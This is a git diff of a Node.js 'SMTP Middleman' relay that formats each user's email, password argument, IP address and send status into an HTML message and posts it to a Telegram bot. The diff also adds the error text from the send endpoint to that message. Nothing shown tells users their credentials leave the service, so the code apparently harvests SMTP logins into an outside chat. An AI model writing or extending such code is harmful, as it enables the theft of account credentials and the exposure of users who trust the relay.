@@ -28,11 +28,11 @@ function escapeHtml(str) {
             .replace(/'/g, '&#39;')
 }
 
-function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status) {
+function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
   const statusText = status === 'SUCCESS' ? '✅ SUCCESS' : '❌ FAILED'
   const statusColorStyle = status === 'SUCCESS' ? '' : ''
 
-  return `
+  let msg = `
 <b>📧 NEW SMTP ACTIVITY</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 <b>👤 Email:</b> <code>${escapeHtml(userEmail)}</code>
@@ -40,16 +40,21 @@ function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, sta
 <b>🌐 IP Address:</b> <code>${escapeHtml(clientIp)}</code>
 <b>📅 Date:</b> ${escapeHtml(tanggal)}
 <b>⏰ Time:</b> ${escapeHtml(pukul)}
-<b>📊 Status:</b> ${statusText}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>SMTP Middleman by ArkRega</i>
-  `.trim()
+<b>📊 Status:</b> ${statusText}`
+
+  if (errorMessage) {
+    msg += `\n<b>⚠️ Error Log:</b> <blockquote>${escapeHtml(errorMessage)}</blockquote>`
+  }
+
+  msg += `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<i>SMTP Middleman by ArkRega</i>`
+
+  return msg.trim()
 }
 
-async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status) {
+async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return
 
-  const messageHtml = buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status)
+  const messageHtml = buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage)
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
@@ -116,7 +121,7 @@ app.post('/api/send', async (req, res) => {
       const dateObj = new Date()
       const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
       const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
-      await sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status)
+      await sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status, error.message)
     }
 
     res.status(500).json({
